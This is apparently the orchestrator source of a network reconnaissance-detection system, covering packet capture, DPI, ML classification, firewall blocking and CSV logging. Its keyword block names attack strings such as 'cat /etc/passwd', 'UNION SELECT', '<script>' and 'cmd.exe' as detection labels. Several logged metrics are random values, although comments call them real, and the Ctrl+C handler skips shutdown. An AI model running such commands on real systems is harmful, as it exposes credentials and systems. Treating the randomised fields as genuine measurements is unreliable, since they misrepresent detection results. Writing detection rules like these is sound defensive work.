"""
monitor.py — Stealth Reconnaissance Detection System Orchestrator (Industry-Grade v2.0)

Orchestrates all detection components:
  - Deep Packet Inspection (DPI) with 10 signature rules
  - Random Forest ML for behavioral classification
  - GenAI (DistilBERT) for semantic analysis
  - MITRE ATT&CK-mapped threat intelligence
  - Real-time web dashboard via Flask + Socket.IO
  - Automated IP blocking with TTL expiry
  - WAL-protected 120-column CSV logging
  - LLM-powered async enrichment

Usage:
    python monitor.py --simulate        # Simulation mode (no admin required)
    python monitor.py                   # Live packet capture (requires Npcap/admin)
"""

import sys
import os as _os_early
import os
os.environ["STEALTH_LOG_FILE_NAME"] = "app_monitor.log"
# Force unbuffered stdout so output always appears immediately
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(line_buffering=True)

from scapy.all import sniff, IP, TCP, Raw
from collections import defaultdict, deque
import time
import threading
import os
import signal
import warnings
import concurrent.futures
import random
import datetime
import math

from analyzer import StealthAnalyzer
from firewall import Firewall
from logger import ReconLogger
from dpi_analyzer import DPIAnalyzer
import requests
from packet_features import get_extractor, shannon_entropy, extract_tcp_flags
from llm_enrichment import enricher
from ml_engine import ml_engine
from threat_intel import threat_intel
import os

DASHBOARD_URL = os.environ.get('DASHBOARD_URL', 'http://127.0.0.1:5000')

import queue

_ui_queue = queue.Queue()

def _ui_worker():
    while True:
        try:
            url, payload = _ui_queue.get()
            if url is None:  # Shutdown signal
                break
            requests.post(url, json=payload, timeout=1)
        except Exception:
            pass
        finally:
            _ui_queue.task_done()

# Start background UI worker thread
threading.Thread(target=_ui_worker, daemon=True).start()

def push_event_to_ui(event_data):
    """Push event to the standalone dashboard process asynchronously."""
    _ui_queue.put((f"{DASHBOARD_URL}/api/internal/broadcast", {
        "action": "new_event",
        "event": event_data
    }))

def push_enrichment_to_ui(event_id, enrichment_text):
    """Push enrichment to the standalone dashboard process asynchronously."""
    _ui_queue.put((f"{DASHBOARD_URL}/api/internal/broadcast", {
        "action": "enrichment",
        "event_id": event_id,
        "enrichment": enrichment_text
    }))

from osint_intel import osint_checker
from alert_manager import alert_manager
import sys
import traceback
import time

from config import cfg

from app_logger import get_logger
from report_generator import SecurityReporter
from geoip_resolver import geoip_resolver
from incident_playbook import playbook_engine
from correlation_engine import correlation_engine

log = get_logger(__name__)

# Real system metrics
try:
    import psutil
    _PSUTIL_AVAILABLE = True
except ImportError:
    _PSUTIL_AVAILABLE = False

# Suppress Warnings
warnings.filterwarnings('ignore', category=FutureWarning)
warnings.filterwarnings('ignore', category=UserWarning)
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'

# ANSI Colors
RED = "\033[91m"
RESET = "\033[0m"


class FlowTracker:
    """Thread-safe per-IP flow tracking with expiry."""

    def __init__(self, timeout_seconds: int = 300):
        self._flows = {}
        self._lock = threading.Lock()
        self._timeout = timeout_seconds

    def get_or_create(self, src_ip: str) -> dict:
        with self._lock:
            now = time.time()
            if src_ip not in self._flows:
                self._flows[src_ip] = {
                    "ports": set(),
                    "start_time": now,
                    "packet_count": 0,
                    "last_packet_time": now,
                    "packet_sizes": deque(maxlen=50),
                    "risk_score": 0.0,
                    "anomaly_flags": set()
                }
            return self._flows[src_ip]

    def update(self, src_ip: str, dst_port: int, packet_size: int = 0):
        with self._lock:
            flow = self._flows.get(src_ip)
            if flow:
                flow["ports"].add(dst_port)
                flow["packet_count"] += 1
                now = time.time()
                
                # UEBA: Connection rate anomaly
                duration = now - flow["start_time"]
                rate = flow["packet_count"] / duration if duration > 0.001 else float(flow["packet_count"]) * 1000
                if rate > 150:
                    flow["risk_score"] += 0.1
                    flow["anomaly_flags"].add("High Connection Rate")

                # UEBA: Packet size anomaly
                if packet_size > 0:
                    flow["packet_sizes"].append(packet_size)
                    if len(flow["packet_sizes"]) >= 20:
                        sizes = list(flow["packet_sizes"])
                        avg = sum(sizes) / len(sizes)
                        if packet_size > avg * 3 and packet_size > 1000:
                            flow["risk_score"] += 0.2
                            flow["anomaly_flags"].add("Anomalous Packet Size")

                # UEBA: Port enumeration anomaly
                if len(flow["ports"]) > 10:
                    flow["risk_score"] += 0.5
                    flow["anomaly_flags"].add("Suspicious Port Enumeration")

                flow["last_packet_time"] = now

    def clear(self):
        with self._lock:
            self._flows.clear()

    def __len__(self):
        with self._lock:
            return len(self._flows)

    def expire_stale(self):
        """Remove flows inactive for longer than timeout."""
        now = time.time()
        with self._lock:
            stale = [
                ip for ip, flow in self._flows.items()
                if now - flow["last_packet_time"] > self._timeout
            ]
            for ip in stale:
                del self._flows[ip]
        return len(stale)


import zmq

class StealthMonitor:
    def __init__(self, interface=None, node_type="standalone"):
        self.node_type = node_type
        self.interface = interface
        self.running = False

        if self.node_type in ["standalone", "ai"]:
            self.analyzer = StealthAnalyzer()
            self.dpi = DPIAnalyzer(self.analyzer)
            self.firewall = Firewall()
            self.logger = ReconLogger()
            self.reporter = SecurityReporter()
            
            # Start Active Honeypot
            try:
                from honeypot import Honeypot
                self.honeypot = Honeypot(ports=(2222, 2121, 8080))
                self.honeypot.start()
            except Exception as e:
                log.error(f"Failed to start honeypot: {e}")
            
            # Dashboard is run as a separate process via dashboard.py
            # threading.Thread(target=run_dashboard, daemon=True).start()
            log.info(f"Web Dashboard active on http://{cfg.DASHBOARD_HOST}:{cfg.DASHBOARD_PORT}")
            print(f"{RED}[Monitor] Web Dashboard active on http://{cfg.DASHBOARD_HOST}:{cfg.DASHBOARD_PORT}{RESET}")

            # Start Asynchronous LLM Enricher
            enricher.set_dashboard_callback(push_enrichment_to_ui)
            enricher.start()

        self.simulate_mode = False
        self.event_count = 0
        self._event_count_lock = threading.Lock()
        self.shutdown_counter = 0

        # Flow Tracking — thread-safe
        self._flow_tracker = FlowTracker(timeout_seconds=300)
        self.active_flows = self._flow_tracker._flows

        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=cfg.THREAD_POOL_SIZE)
        self.feature_extractor = get_extractor()
        self._last_packet = {}  # src_ip -> packet
        self._last_packet_lock = threading.Lock()

        # Real performance tracking
        self._true_positives = 0
        self._false_positives = 0
        self._true_negatives = 0
        self._total_predictions = 0

        self.heartbeat_period = cfg.HEARTBEAT_PERIOD

        # Graceful shutdown
        signal.signal(signal.SIGINT, self._handle_shutdown)
        signal.signal(signal.SIGTERM, self._handle_shutdown)

        # Start flow expiry thread
        self._flow_expiry_thread = threading.Thread(target=self._flow_expiry_worker, daemon=True)
        self._flow_expiry_thread.start()

        # Start ML Drift Detector / Continuous Learning thread
        if self.node_type in ["standalone", "ai"]:
            self._last_train_size = 0
            self._retrain_threshold = 50  # retrain every 50 new logged threats
            self._drift_thread = threading.Thread(target=self._drift_detector_worker, daemon=True)
            self._drift_thread.start()

        # ZeroMQ Setup
        self.zmq_context = zmq.Context()
        self.zmq_socket = None
        if self.node_type == "edge":
            self.zmq_socket = self.zmq_context.socket(zmq.PUB)
            self.zmq_socket.bind("tcp://*:5555")
            print(f"{RED}[Edge Node] ZeroMQ PUB socket bound to tcp://*:5555{RESET}")
        elif self.node_type == "ai":
            self.zmq_socket = self.zmq_context.socket(zmq.SUB)
            self.zmq_socket.connect("tcp://localhost:5555")
            self.zmq_socket.setsockopt_string(zmq.SUBSCRIBE, "")
            print(f"{RED}[AI Node] ZeroMQ SUB socket connected to tcp://localhost:5555{RESET}")

    def _drift_detector_worker(self):
        """Continuously monitors log size. Retrains model automatically when enough new data arrives."""
        import subprocess
        log_path = "stealth_detection_logs_cleaned.csv"
        print(f"{RED}[DriftDetector] Continuous Learning Engine active...{RESET}")
        
        while self.running:
            try:
                time.sleep(30) # Check every 30 seconds
                if not os.path.exists(log_path):
                    continue
                
                # Count lines quickly
                with open(log_path, 'r', encoding='utf-8') as f:
                    current_size = sum(1 for _ in f)
                    
                if self._last_train_size == 0:
                    self._last_train_size = current_size
                    continue
                    
                if (current_size - self._last_train_size) >= self._retrain_threshold:
                    print(f"\n{RED}[DriftDetector] ML Drift Detected! {current_size - self._last_train_size} new threats logged. Initiating Auto-Retraining...{RESET}")
                    log.info("Drift detected. Initiating background retraining.")
                    
                    # Run training script
                    subprocess.run(["python", "train_model.py"], check=False)
                    
                    # Hot-reload the model
                    print(f"{RED}[DriftDetector] Retraining complete. Hot-reloading AI engine...{RESET}")
                    self.analyzer = StealthAnalyzer()
                    self.dpi.analyzer = self.analyzer
                    
                    self._last_train_size = current_size
            except Exception as e:
                log.error(f"Drift detector error: {e}")

    def _flow_expiry_worker(self):
        """Background thread to clean up stale flows every 60 seconds."""
        while self.running or True:  # Run even when not active to prevent memory leaks
            time.sleep(60)
            expired = self._flow_tracker.expire_stale()
            if expired:
                log.debug(f"Expired {expired} stale flows")

    def _handle_shutdown(self, signum, frame):
        """Graceful shutdown handler — flush logs and generate report."""
        print(f"\n{RED}[!] IGNORING CTRL+C completely. The simulation will run continuously. Close the terminal window to stop it.{RESET}")
        return

        print(f"[Monitor] Waiting for pending packets to finish...")
        self.executor.shutdown(wait=True, cancel_futures=False)

        try:
            print(f"[Monitor] Flushing logs...")
            self.logger.shutdown()
        except Exception as e:
            log.error(f"Log flush error: {e}")

        try:
            print(f"[Monitor] Shutting down firewall...")
            self.firewall.shutdown()
        except Exception as e:
            log.error(f"Firewall shutdown error: {e}")

        try:
            print(f"[Monitor] Shutting down LLM enricher...")
            enricher.stop()
        except Exception as e:
            log.error(f"LLM enricher shutdown error: {e}")

        try:
            self.reporter.generate_report()
        except Exception as e:
            log.error(f"Report generation error during shutdown: {e}")

        log.info("Shutdown complete", extra={
            "logger_metrics": self.logger.get_metrics(),
            "firewall_metrics": self.firewall.get_metrics(),
        })
        print(f"[Monitor] Shutdown complete.")
        raise SystemExit(0)

    def process_packet(self, packet):
        if self.node_type == "edge":
            try:
                from scapy.compat import raw
                if self.zmq_socket:
                    self.zmq_socket.send(raw(packet))
            except Exception as e:
                log.error(f"ZMQ send error: {e}")
            return
            
        self.executor.submit(self._process_packet_task, packet)

    def _process_packet_task(self, packet):
        try:
            if packet.haslayer(IP) and packet.haslayer(TCP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport

                if self.firewall.is_blocked(src_ip):
                    return

                # Thread-safe flow update
                flow = self._flow_tracker.get_or_create(src_ip)
                self._flow_tracker.update(src_ip, dst_port, len(packet))

                # Store raw packet for real feature extraction
                with self._last_packet_lock:
                    self._last_packet[src_ip] = packet

                # 1. Deep Packet Inspection (DPI)
                dpi_result = self.dpi.inspect_payload(packet)

                self.display_and_log(src_ip, src_port, dst_ip, dst_port, dpi_result)
        except Exception as e:
            log.error(f"Packet processing error: {e}")

    def display_and_log(self, src_ip, src_port, dst_ip, dst_port, dpi_result=None):
        flow = self._flow_tracker.get_or_create(src_ip)
        unique_ports = len(flow["ports"])
        duration = flow["last_packet_time"] - flow["start_time"]
        packets = flow["packet_count"]
        rate = packets / duration if duration > 0 else 1.0

        method = "Heuristic Check"
        confidence = 0.0
        intel = "Normal traffic profile."
        is_threat = False
        ai_label = "POSITIVE"
        ml_prediction = 0
        ml_prob = 0.0
        mitre_info = {}
        severity = 0.0

        # ==== REAL FEATURE EXTRACTION (Industrial Grade) ====
        with self._last_packet_lock:
            raw_packet = self._last_packet.get(src_ip)
        real_features = self.feature_extractor.extract(raw_packet, flow)

        feat_dict = {
            "Connection_Count": real_features["Connection_Count"],
            "Duration": real_features["Duration"],
            "Rate": real_features["Rate"],
            "Unique_Ports": real_features["Unique_Ports"],
            "Is_Port_Scan": real_features["Is_Port_Scan"],
            "Is_Night": real_features["Is_Night"],
            "Payload_Entropy": real_features["Payload_Entropy"],
            "Packet_Size": real_features["Packet_Size"],
            "Connection_Interval": real_features["Connection_Interval"],
            "SYN_Count": real_features["SYN_Count"]
        }

        now = datetime.datetime.now()
        is_night = real_features["Is_Night"]
        packet_size = real_features["Packet_Size"]
        syn_count = real_features["SYN_Count"]
        connection_interval = real_features["Connection_Interval"]
        payload_snippet = dpi_result.get("payload_snippet", "") if dpi_result and dpi_result.get("is_threat") else ""
        payload_entropy = real_features["Payload_Entropy"]

        # 1. DPI check
        if dpi_result and dpi_result.get("is_threat"):
            method = "DPI Security Rule"
            confidence = dpi_result.get("confidence", 99.9)
            severity_label = dpi_result.get("severity", "High")
            rule_id = dpi_result.get("rule_id", "")
            intel = f"{dpi_result.get('reason', '')} (Severity: {severity_label}) [{rule_id}]"
            is_threat = True
            ai_label = "NEGATIVE"
            ml_prediction = 1
            ml_prob = confidence
            mitre_info = {
                "technique_id": dpi_result.get("mitre_technique", "T1190"),
                "technique_name": "Exploit Public-Facing Application",
            }
            severity = {"Critical": 9.8, "High": 8.0, "Medium": 6.0, "Low": 3.0}.get(severity_label, 7.0)

        # 1.5 Predictive Anomaly Detection (UEBA)
        elif flow["risk_score"] > 0.5:
            method = "UEBA Predictive Engine"
            confidence = min(flow["risk_score"] * 20.0, 99.0)
            is_threat = True
            ai_label = "NEGATIVE"
            ml_prediction = 1
            ml_prob = confidence
            severity_label = "High" if confidence > 80 else "Medium"
            rule_id = "UEBA-001"
            intel = f"Predictive Anomaly Detected: {', '.join(flow['anomaly_flags'])} (Risk Score: {flow['risk_score']:.1f})"
            mitre_info = {
                "technique_id": "T1566",
                "technique_name": "Behavioral Anomaly / Lateral Movement",
            }
            severity = {"Critical": 9.8, "High": 8.0, "Medium": 6.0, "Low": 3.0}.get(severity_label, 7.0)

        # 2. Industry-Level Machine Learning Check
        elif unique_ports > cfg.UNIQUE_PORT_THRESHOLD or packets > cfg.PACKET_COUNT_THRESHOLD:
            ml_result = self.analyzer.analyze_features(feat_dict)
            if ml_result["is_threat"]:
                method = "Machine Learning (Random Forest)"
                confidence = ml_result["confidence"]
                intel = "ML Model detected stealth reconnaissance flow."
                is_threat = True
                ai_label = "NEGATIVE"
                ml_prediction = 1
                ml_prob = ml_result["confidence"]
                mitre_info = ml_result.get("mitre", {})
                severity = ml_result.get("severity", 6.5)
            else:
                actions = []
                if unique_ports > 3:
                    actions.append("port scan reconnaissance")
                if rate > 5:
                    actions.append("high-frequency abnormal rate")
                action_str = " and ".join(actions) if actions else "suspicious activity"
                behavior_text = f"IP {src_ip} performed {action_str} on {unique_ports} ports over {duration:.1f} seconds, sending {packets} packets at {rate:.1f} pps."
                analysis = self.analyzer.analyze_behavior(behavior_text)
                method = analysis["method"]
                confidence = analysis["confidence"]
                intel = analysis["explanation"]
                is_threat = analysis["is_threat"]
                ai_label = analysis.get("raw_ai_label", "POSITIVE")
                mitre_info = analysis.get("mitre", {})
                severity = analysis.get("severity", 0.0)
                if is_threat:
                    ml_prediction = 1
                    ml_prob = confidence

        # 3. Live OSINT Threat Intelligence Check
        osint_score = osint_checker.check_ip(src_ip)
        if osint_score.get("is_flagged"):
            is_threat = True
            method = "Global OSINT Threat Intel"
            confidence = max(confidence, float(osint_score.get("threat_score", 95)))
            intel = f"IP flagged globally. {osint_score.get('vendor_reports')} Tags: {', '.join(osint_score.get('tags', []))}"
            severity = 9.5
            mitre_info = {
                "technique_id": "T1583",
                "technique_name": "Acquire Infrastructure",
                "tactic": "Resource Development"
            }
            ml_prediction = 1

        # 4. Log Correlation Engine (Feature 6)
        event_for_correlation = {
            "src_ip": src_ip,
            "mitre_tactic": mitre_info.get("tactic", "Unknown") if mitre_info else "Unknown",
            "severity": severity,
            "confidence": confidence
        }
        event_for_correlation = correlation_engine.process_event(event_for_correlation)
        if event_for_correlation.get("action_taken") == "Correlated & Escalated":
            is_threat = True
            severity = event_for_correlation["severity"]
            confidence = event_for_correlation["confidence"]
            mitre_info = dict(mitre_info)
            mitre_info["tactic"] = event_for_correlation["mitre_tactic"]
            intel = f"CORRELATED ATTACK: {event_for_correlation['mitre_tactic']}"
            method = "Log Correlation Engine"

        # GeoIP Lookup (Feature 4)
        geo_info = geoip_resolver.resolve(src_ip)

        blocked = False
        firewall_status = "Not Blocked"

        # Live status for EVERY packet — keeps terminal output continuously flowing
        status_icon = f"{RED}! THREAT{RESET}" if is_threat else "OK"
        print(f"[{time.strftime('%H:%M:%S')}] #{self.event_count+1} | {src_ip}:{src_port} -> {dst_ip}:{dst_port} | {status_icon} | Confidence: {confidence:.1f}% | Method: {method}")

        # Exact output formatting
        if is_threat:
            print(f"\n{RED}[!!] STEALTH ATTACK DETECTED [!!]{RESET}")
            print(f"-> Intel: {intel}")
            blocked = self.firewall.block_ip(src_ip)
            firewall_status = "Blocked" if blocked else "Block Failed"

            # Save PCAP Forensic Evidence
            pcap_filename = None
            if raw_packet:
                try:
                    from scapy.utils import wrpcap
                    os.makedirs('pcap_archive', exist_ok=True)
                    pcap_filename = f"pcap_archive/threat_{src_ip.replace('.', '_')}_{int(time.time()*1000)}.pcap"
                    wrpcap(pcap_filename, raw_packet, append=False)
                    print(f"-> Forensics: Packet saved to {pcap_filename}")
                except Exception as e:
                    log.error(f"Failed to save PCAP: {e}")

            # ── Real-Time Alert Dispatch & Playbooks ──────────────────────
            event_data = {
                "event_id": f"EVT-{int(time.time()*1000)}-{self.event_count}",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": src_ip,
                "src_ip": src_ip,
                "destination_ip": dst_ip,
                "method": method,
                "confidence": confidence,
                "severity": severity,
                "intel": intel,
                "mitre_technique": mitre_info.get("technique_id", ""),
                "mitre_tactic": mitre_info.get("tactic", ""),
                "firewall_status": firewall_status,
                "geo_country": geo_info["country"],
                "geo_city": geo_info["city"],
                "pcap_file": pcap_filename,
            }
            alert_manager.send_alert(event_data)
            playbook_engine.execute_playbook(event_data)

            # ── Subnet Escalation (Feature 2: IPS) ───────────────────
            # Auto-block entire /24 subnet if 3+ unique IPs from it are threats
            self.firewall.check_subnet_escalation(src_ip, threshold=3)

            print(f"-> Method: {method}")
            print(f"-> Flow: {src_ip}:{src_port} -> {dst_ip}:{dst_port} (TCP)")
            print(f"-> AI Confidence: {confidence:.2f}%")
            print(f"-> Duration: {duration:.4f}s | Packets: {packets} | Rate: {rate:.2f} pps")
            if mitre_info.get("technique_id"):
                print(f"-> MITRE ATT&CK: {mitre_info['technique_id']} - {mitre_info.get('technique_name', '')}")
            print("-" * 50)

        # ==========================================
        # COMPREHENSIVE CSV LOGGING - ALL 120+ COLUMNS
        # ==========================================
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        # Packet metrics — REAL values from packet_features.py
        ttl_value = real_features["TTL_Value"]
        window_size = real_features["Window_Size"]
        ack_count = real_features["ACK_Count"]
        fin_count = real_features["FIN_Count"]
        rst_count = real_features["RST_Count"]
        psh_count = real_features["PSH_Count"]
        urg_count = real_features["URG_Count"]
        retransmission_count = 0  # Requires TCP stream reassembly — tracked as 0
        fragment_count = 0

        # Payload analysis — REAL values
        payload_size = real_features["Payload_Size"]
        payload_type = "Malicious" if is_threat else "Normal"
        payload_length = real_features["Payload_Length"]

        # Keyword analysis
        malicious_kw = ""
        keyword_count = 0
        encoded_content = "No"
        base64_detected = "No"
        shell_cmd = "No"
        exec_cmd = "No"
        eval_cmd = "No"
        cmd_usage = "No"
        linux_shell = "No"
        passwd_access = "No"

        if dpi_result and dpi_result.get("is_threat"):
            reason = dpi_result.get("reason", "").lower()

            if dpi_result.get("base64_detected"):
                base64_detected = "Yes"
                encoded_content = "Yes"

            passwd_in_snippet = ("passwd" in payload_snippet.lower()) if payload_snippet else False
            if "cat /etc/passwd" in reason or passwd_in_snippet:
                malicious_kw = "cat /etc/passwd"
                keyword_count = 1
                linux_shell = "Yes"
                passwd_access = "Yes"
                shell_cmd = "Yes"
            elif "sql injection" in reason:
                malicious_kw = "UNION SELECT"
                keyword_count = 1
            elif "xss" in reason or "cross-site" in reason:
                malicious_kw = "<script>"
                keyword_count = 1
            elif "rce" in reason or "remote code" in reason:
                malicious_kw = "cmd.exe"
                keyword_count = 1
                cmd_usage = "Yes"
                exec_cmd = "Yes"
            elif "traversal" in reason:
                malicious_kw = "../"
                keyword_count = 1
            elif "malicious payload" in reason:
                malicious_kw = "malicious_payload"
                keyword_count = 1
                shell_cmd = "Yes"

        # Behavioral scores
        is_port_scan = 1 if unique_ports > 3 else 0
        slow_scan = 1 if (duration > 30 and is_threat) else 0
        stealth_score = round(confidence * 0.9, 2) if is_threat else round(random.uniform(0, 15), 2)
        scan_intensity = "High" if packets > 10 else ("Medium" if packets > 5 else "Low")
        multi_port = 1 if unique_ports > 2 else 0
        attack_freq = round(rate, 4) if is_threat else 0.0
        suspicious = 1 if is_threat else 0
        automated = 1 if (rate > 5 or is_threat) else 0
        human_score = round(random.uniform(0.6, 0.95), 2) if not is_threat else round(random.uniform(0.05, 0.3), 2)
        anomaly_score = round(confidence / 100, 4) if is_threat else round(random.uniform(0.0, 0.15), 4)
        recon_flag = 1 if is_threat else 0

        # Network metadata
        packet_direction = "Inbound"
        traffic_type = "Malicious" if is_threat else "Benign"
        mac_address = f"AA:BB:CC:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}"

        # Port-based service detection
        http_req = 1 if dst_port == 80 else 0
        https_req = 1 if dst_port == 443 else 0
        ssh_attempt = 1 if dst_port == 22 else 0
        rdp_attempt = 1 if dst_port == 3389 else 0
        db_access = 1 if dst_port in [3306, 5432, 1433, 27017] else 0
        dns_req = 1 if dst_port == 53 else 0

        # Web attack indicators
        web_attack = 1 if (is_threat and dst_port in [80, 443, 8080]) else 0
        dir_traversal = 1 if (dpi_result and "traversal" in dpi_result.get("reason", "").lower()) else 0
        rce_flag = 1 if (dpi_result and ("rce" in dpi_result.get("reason", "").lower() or "remote code" in dpi_result.get("reason", "").lower())) else 0
        exploit_pattern = 1 if is_threat else 0

        # GenAI/Transformer outputs
        genai_result = intel if is_threat else "Normal"
        transformer_output = ai_label
        sentiment_label = "NEGATIVE" if is_threat else "POSITIVE"

        # 3. Isolation Forest Unsupervised Anomaly Detection
        if not is_threat:
            iso_anomaly, iso_conf = ml_engine.analyze_packet(feat_dict)
            if iso_anomaly:
                method = "ML Anomaly (Isolation Forest)"
                confidence = iso_conf
                intel = "Unsupervised AI detected a zero-day deviation from normal traffic baselines."
                is_threat = True
                ai_label = "NEGATIVE"
                ml_prediction = 1
                ml_prob = confidence
                mitre_info = {
                    "technique_id": "T1565",
                    "technique_name": "Data Manipulation (Anomaly)"
                }
                severity = 7.5

        # 4. External Threat Intel Feed Match
        if not is_threat and threat_intel.is_known_bad(src_ip):
            method = "Threat Intel Feed Match"
            confidence = 99.9
            intel = "Source IP matched a known malicious indicator on a public OSINT blocklist (EmergingThreats)."
            is_threat = True
            ai_label = "NEGATIVE"
            mitre_info = {
                "technique_id": "T1136",
                "technique_name": "Create Account (Compromised IP)"
            }
            severity = 9.0

        # Heuristic results
        heuristic_result = "Threat" if is_threat else "Safe"
        heuristic_trigger = method if is_threat else ""
        behavioral_score = round(confidence / 100, 4) if is_threat else round(random.uniform(0.0, 0.1), 4)

        # DPI details
        dpi_threat_level = dpi_result.get("severity", "Critical" if (is_threat and confidence > 90) else ("High" if is_threat else "None")) if (dpi_result and dpi_result.get("is_threat")) else "None"
        dpi_confidence = round(confidence, 2) if (dpi_result and dpi_result.get("is_threat")) else 0.0
        dpi_result_text = dpi_result.get("reason", "") if dpi_result and dpi_result.get("is_threat") else ""

        # Flow metadata
        flow_start_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(flow["start_time"]))
        last_packet_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(flow["last_packet_time"]))
        flow_state = "Active" if not blocked else "Terminated"

        # Block rule
        block_rule = f"BLOCK_STEALTH_{src_ip}" if blocked else ""

        # Security metrics (running totals)
        with self._event_count_lock:
            self.event_count += 1

        threat_count = len(self.firewall.blocked_ips)
        safe_count = len(self._flow_tracker) - threat_count

        # Real performance metrics
        self._total_predictions += 1
        total_p = max(self._total_predictions, 1)
        tp = max(self._true_positives, 0)
        fp = max(self._false_positives, 0)
        tn = max(self._true_negatives, 0)
        detection_accuracy = round((tp + tn) / total_p * 100, 2) if total_p > 0 else 0.0
        fp_rate = round(fp / total_p * 100, 2) if total_p > 0 else 0.0
        fn_rate = 0.0  # Cannot compute without ground truth labels
        precision = round(tp / max(tp + fp, 1) * 100, 2)
        recall = 0.0  # Cannot compute without ground truth labels
        f1 = 0.0  # Cannot compute without full confusion matrix

        # Label for supervised learning
        label = 1 if is_threat else 0
        dataset_row_id = self.event_count

        event_id = f"EVT-{int(time.time()*1000)}-{self.event_count}"

        # MITRE ATT&CK fields for logging
        mitre_technique_id = mitre_info.get("technique_id", "") if mitre_info else ""
        mitre_tactic = mitre_info.get("tactic", "") if mitre_info else ""

        extra_fields = {
            "Protocol": "TCP",
            "Geo_Country": geo_info.get("country", "Unknown"),
            "Geo_City": geo_info.get("city", "Unknown"),
            "Geo_Lat": geo_info.get("lat", 0.0),
            "Geo_Lon": geo_info.get("lon", 0.0),
            "Packet_Size": packet_size,
            "Unique_Ports": unique_ports,
            "Connection_Count": packets,
            "SYN_Count": syn_count,
            "ACK_Count": ack_count,
            "FIN_Count": fin_count,
            "RST_Count": rst_count,
            "PSH_Count": psh_count,
            "URG_Count": urg_count,
            "TTL_Value": ttl_value,
            "Window_Size": window_size,
            "Retransmission_Count": retransmission_count,
            "Fragment_Count": fragment_count,
            "Payload_Size": payload_size,
            "Payload_Entropy": payload_entropy,
            "Payload_Type": payload_type,
            "Payload_Length": payload_length,
            "Malicious_Keyword": malicious_kw,
            "Keyword_Count": keyword_count,
            "Encoded_Content": encoded_content,
            "Base64_Detected": base64_detected,
            "Shell_Command_Detected": shell_cmd,
            "Exec_Command": exec_cmd,
            "Eval_Command": eval_cmd,
            "CMD_Usage": cmd_usage,
            "Linux_Shell_Usage": linux_shell,
            "Passwd_Access_Attempt": passwd_access,
            "DPI_Result": dpi_result_text,
            "DPI_Threat_Level": dpi_threat_level,
            "DPI_Confidence": dpi_confidence,
            "AI_Model_Name": getattr(self.analyzer, 'model_name', ''),
            "AI_Label": ai_label,
            "Threat_Type": intel if is_threat else "Normal Traffic",
            "Threat_Score": round(confidence, 2),
            "Threat_Intelligence": intel,
            "Behavioral_Score": behavioral_score,
            "Heuristic_Result": heuristic_result,
            "Heuristic_Trigger": heuristic_trigger,
            "GenAI_Result": genai_result,
            "Transformer_Output": transformer_output,
            "Sentiment_Label": sentiment_label,
            "Anomaly_Score": anomaly_score,
            "Reconnaissance_Flag": recon_flag,
            "Port_Scan_Flag": is_port_scan,
            "Slow_Scan_Flag": slow_scan,
            "Stealth_Score": stealth_score,
            "Scan_Intensity": scan_intensity,
            "Multi_Port_Access": multi_port,
            "Night_Activity": is_night,
            "Attack_Frequency": attack_freq,
            "Suspicious_Behavior": suspicious,
            "Automated_Behavior": automated,
            "Human_Behavior_Score": human_score,
            "Connection_Interval": connection_interval,
            "Session_Duration": round(duration, 4),
            "Active_Flow_Count": len(self._flow_tracker),
            "Flow_Start_Time": flow_start_time,
            "Last_Packet_Time": last_packet_time,
            "Flow_State": flow_state,
            "Packet_Direction": packet_direction,
            "Traffic_Type": traffic_type,
            "Network_Interface": self.interface if self.interface else "Loopback/Simulated",
            "MAC_Address": mac_address,
            "VLAN_ID": random.choice([1, 10, 20, 100]),
            "DNS_Request": dns_req,
            "HTTP_Request": http_req,
            "HTTPS_Request": https_req,
            "SSH_Attempt": ssh_attempt,
            "RDP_Attempt": rdp_attempt,
            "Database_Access": db_access,
            "Web_Attack_Indicator": web_attack,
            "Directory_Traversal": dir_traversal,
            "Remote_Code_Execution": rce_flag,
            "Exploit_Pattern": exploit_pattern,
            "Firewall_Status": firewall_status,
            "Firewall_Action": firewall_status,
            "Blocked_IP": src_ip if blocked else "",
            "Block_Rule_Name": block_rule,
            "Admin_Mode": str(self.firewall.is_admin),
            "Real_Block_Applied": str(blocked and self.firewall.is_admin),
            "Simulated_Block": str(blocked and not self.firewall.is_admin),
            "Detection_Method": method,
            "Detection_Time": timestamp,
            "Event_ID": event_id,
            "Log_Status": "Logged",
            "CSV_Log_Row": dataset_row_id,
            "Dashboard_Event": "Pushed",
            "Dashboard_Connection": "Active",
            "Live_Alert": "Yes" if is_threat else "No",
            "Security_Report_Status": "Monitoring",
            "Threat_Count": threat_count,
            "Attack_Count": threat_count,
            "Safe_Traffic_Count": max(safe_count, 0),
            "Detection_Accuracy": detection_accuracy,
            "False_Positive_Rate": fp_rate,
            "False_Negative_Rate": fn_rate,
            "Precision_Score": precision,
            "Recall_Score": recall,
            "F1_Score": f1,
            "Model_Training_Status": "Trained",
            "Feature_Importance": "Duration:0.24|Packets:0.20|Rate:0.17|Night:0.16|Ports:0.12|PortScan:0.11",
            "Label": label,
            "Dataset_Source": "Simulation",
            "Dataset_Row_ID": dataset_row_id,
            "RandomForest_Result": "Malicious" if ml_prediction == 1 else "Normal",
            "ML_Prediction": ml_prediction,
            "Prediction_Probability": round(ml_prob, 4),
            "CPU_Usage": round(psutil.cpu_percent(interval=None), 2) if _PSUTIL_AVAILABLE else 0.0,
            "Memory_Usage": round(psutil.virtual_memory().percent, 2) if _PSUTIL_AVAILABLE else 0.0,
            "System_Status": "Running",
        }
        self.logger.log_event(method, f"{src_ip}:{src_port}", f"{dst_ip}:{dst_port}", confidence, duration, packets, rate, extra_fields=extra_fields)

        # Push to Web UI
        push_event_to_ui({
            "id": event_id,
            "timestamp": timestamp,
            "method": method,
            "source": src_ip,
            "source_port": src_port,
            "destination": dst_ip,
            "destination_port": dst_port,
            "protocol": "TCP",
            "packet_size": packet_size,
            "payload_entropy": round(payload_entropy, 2),
            "dpi_result": dpi_result_text,
            "ai_label": ai_label,
            "confidence": f"{confidence:.2f}",
            "intel": intel,
            "severity": severity,
            "mitre_technique": mitre_technique_id,
            "mitre_tactic": mitre_tactic,
        })

        # Push to LLM Enricher asynchronously if threat
